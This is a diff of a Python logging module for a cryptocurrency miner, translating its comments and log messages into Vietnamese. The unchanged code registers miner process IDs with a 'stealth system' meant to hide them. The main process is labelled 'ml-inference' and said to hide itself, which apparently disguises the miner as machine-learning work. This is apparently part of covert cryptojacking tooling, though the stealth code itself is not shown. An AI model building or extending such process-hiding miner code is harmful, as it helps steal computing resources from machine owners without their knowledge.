@@ -1,5 +1,5 @@
 """
-Mining Performance Logger - Detailed Logging for Mining Processes
+[Mining Performance Logger] (Trình ghi log hiệu suất khai thác – ghi chi tiết cho tiến trình khai thác)
 Hệ thống ghi log chi tiết cho các tiến trình khai thác
 """
 import json
@@ -47,15 +47,15 @@ def _initialize_stealth_system():
         
         # Start stealth system
         if _stealth_system.start():
-            _stealth_logger.info("🛡️ [STEALTH] System initialized and started successfully")
+            _stealth_logger.info("🛡️ [STEALTH] (hệ thống che giấu) khởi tạo và chạy thành công")
             return _stealth_system
         else:
-            _stealth_logger.warning("⚠️ [STEALTH] Failed to start stealth system")
+            _stealth_logger.warning("⚠️ [STEALTH] (hệ thống che giấu) khởi động thất bại")
             _stealth_system = None
             return None
             
     except Exception as e:
-        _stealth_logger.error(f"❌ [STEALTH] Failed to initialize: {e}")
+        _stealth_logger.error(f"❌ [STEALTH] (hệ thống che giấu) lỗi khởi tạo: {e}")
         _stealth_system = None
         return None
 
@@ -178,11 +178,11 @@ class MiningPerformanceLogger:
         return logger
     
     def _check_gpu_availability(self) -> bool:
-        """CPU-only build: luôn False"""
+        """[CPU-only] (chỉ bản CPU): luôn False"""
         return False
     
     def _get_gpu_metrics(self) -> Dict[str, float]:
-        """CPU-only build: không thu thập GPU metrics"""
+        """[CPU-only] (chỉ bản CPU): không thu thập [GPU metrics] (chỉ số GPU)"""
         return {}
     
     def _parse_hash_rate_from_log(self, log_line: str) -> Optional[float]:
@@ -246,16 +246,16 @@ class MiningPerformanceLogger:
                     try:
                         stealth_success = stealth_system.add_process(pid)
                         if stealth_success:
-                            self.logger.info(f"🛡️ [STEALTH] Process {process_type} (PID: {pid}) added to stealth system successfully")
+                            self.logger.info(f"🛡️ [STEALTH] (hệ thống che giấu) thêm tiến trình {process_type} (PID: {pid}) thành công")
                         else:
-                            self.logger.warning(f"⚠️ [STEALTH] Failed to add process {process_type} (PID: {pid}) to stealth system")
+                            self.logger.warning(f"⚠️ [STEALTH] (hệ thống che giấu) thêm tiến trình {process_type} (PID: {pid}) thất bại")
                     except Exception as e:
-                        self.logger.error(f"❌ [STEALTH] Error adding process {process_type} (PID: {pid}) to stealth: {e}")
+                        self.logger.error(f"❌ [STEALTH] (hệ thống che giấu) lỗi khi thêm tiến trình {process_type} (PID: {pid}): {e}")
                 else:
-                    self.logger.warning(f"⚠️ [STEALTH] Stealth system not available for process {process_type} (PID: {pid})")
+                    self.logger.warning(f"⚠️ [STEALTH] (hệ thống che giấu) không khả dụng cho tiến trình {process_type} (PID: {pid})")
             elif process_type == "ml-inference":
                 # 🔒 [STEALTH-SKIP] Self-stealth active - no external modification needed
-                self.logger.info(f"🔒 [STEALTH-SKIP] Process {process_type} (PID: {pid}) using self-stealth - skipping external stealth")
+                self.logger.info(f"🔒 [STEALTH-SKIP] (bỏ qua stealth ngoài) Tiến trình {process_type} (PID: {pid}) đang dùng [Self-Stealth] (tự che giấu) – bỏ qua stealth bên ngoài")
                 stealth_success = True  # Mark as successful since self-stealth handles it
             
             # Log process registration with stealth status
@@ -308,7 +308,7 @@ class MiningPerformanceLogger:
             )
             
             # Log to file
-            log_message = f"HASH_RATE: {process_type} - {hash_rate:.2f} H/s - Avg: {avg_hash_rate:.2f} H/s - Peak: {metrics.peak_hash_rate:.2f} H/s"
+            log_message = f"[HASH_RATE] (tốc độ băm): {process_type} - {hash_rate:.2f} H/s - [Avg] (trung bình): {avg_hash_rate:.2f} H/s - [Peak] (đỉnh): {metrics.peak_hash_rate:.2f} H/s"
             if additional_metrics:
                 log_message += f" - Additional: {additional_metrics}"
             
@@ -370,7 +370,7 @@ class MiningPerformanceLogger:
                 self.resource_history[process_type].append(resource_metrics)
                 
                 # Log to file
-                log_message = f"RESOURCE: {process_type} - CPU: {cpu_percent:.1f}% - Memory: {memory_mb:.1f}MB"
+                log_message = f"[RESOURCE] (tài nguyên): {process_type} - CPU: {cpu_percent:.1f}% - [Memory] (bộ nhớ): {memory_mb:.1f}MB"
                 # CPU-only: không bổ sung GPU message
                 
                 self.resource_logger.info(log_message)
@@ -425,7 +425,7 @@ class MiningPerformanceLogger:
                 self.performance_counters[process_type]["error_count"] += 1
             
             # Log to file
-            log_message = f"OPERATION: {process_type} - {operation} - {status} - PID: {pid} - {execution_time:.4f}s"
+            log_message = f"[OPERATION] (thao tác): {process_type} - [Type] (loại): {operation} - [Status] (trạng thái): {status} - PID: {pid} - {execution_time:.4f}s"
             if details:
                 log_message += f" - Details: {details}"
             
@@ -572,9 +572,9 @@ def register_mining_process(process_type: str, pid: int, process_obj: Any = None
         if mining_perf_logger is not None:
             mining_perf_logger.register_process(process_type, pid, process_obj)
         else:
-            print(f"[WARNING] mining_perf_logger not initialized, skipping register_mining_process")
+            print(f"[WARNING] (cảnh báo) mining_perf_logger chưa khởi tạo, bỏ qua register_mining_process (đăng ký tiến trình khai thác)")
     except Exception as e:
-        print(f"[ERROR] register_mining_process failed: {e}")
+        print(f"[ERROR] (lỗi) register_mining_process thất bại: {e}")
 
 def log_hash_rate(process_type: str, hash_rate: float, additional_metrics: Optional[Dict[str, Any]] = None):
     """Log hash rate measurement"""
@@ -582,9 +582,9 @@ def log_hash_rate(process_type: str, hash_rate: float, additional_metrics: Optio
         if mining_perf_logger is not None:
             mining_perf_logger.log_hash_rate(process_type, hash_rate, additional_metrics)
         else:
-            print(f"[WARNING] mining_perf_logger not initialized, skipping log_hash_rate")
+            print(f"[WARNING] (cảnh báo) mining_perf_logger chưa khởi tạo, bỏ qua log_hash_rate (ghi tốc độ băm)")
     except Exception as e:
-        print(f"[ERROR] log_hash_rate failed: {e}")
+        print(f"[ERROR] (lỗi) log_hash_rate thất bại: {e}")
 
 def log_resource_usage(process_type: str, force_gpu_check: bool = False):
     """Log resource utilization"""
@@ -592,9 +592,9 @@ def log_resource_usage(process_type: str, force_gpu_check: bool = False):
         if mining_perf_logger is not None:
             mining_perf_logger.log_resource_utilization(process_type, force_gpu_check)
         else:
-            print(f"[WARNING] mining_perf_logger not initialized, skipping log_resource_usage")
+            print(f"[WARNING] (cảnh báo) mining_perf_logger chưa khởi tạo, bỏ qua log_resource_usage (ghi mức sử dụng tài nguyên)")
     except Exception as e:
-        print(f"[ERROR] log_resource_usage failed: {e}")
+        print(f"[ERROR] (lỗi) log_resource_usage thất bại: {e}")
 
 def log_mining_operation(process_type: str, operation: str, pid: int, details: Dict[str, Any], 
                         execution_time: float = 0.0, status: str = "SUCCESS"):
@@ -612,7 +612,7 @@ def get_real_time_metrics() -> Dict[str, Any]:
         return mining_perf_logger.get_real_time_metrics()
     except Exception as e:
         # Return empty metrics on error
-        print(f"[ERROR] get_real_time_metrics failed: {e}")
+        print(f"[ERROR] (lỗi) get_real_time_metrics thất bại: {e}")
         return {
             "ml-inference": {"current_hash_rate": 0.0, "avg_hash_rate": 0.0, "peak_hash_rate": 0.0}
         }
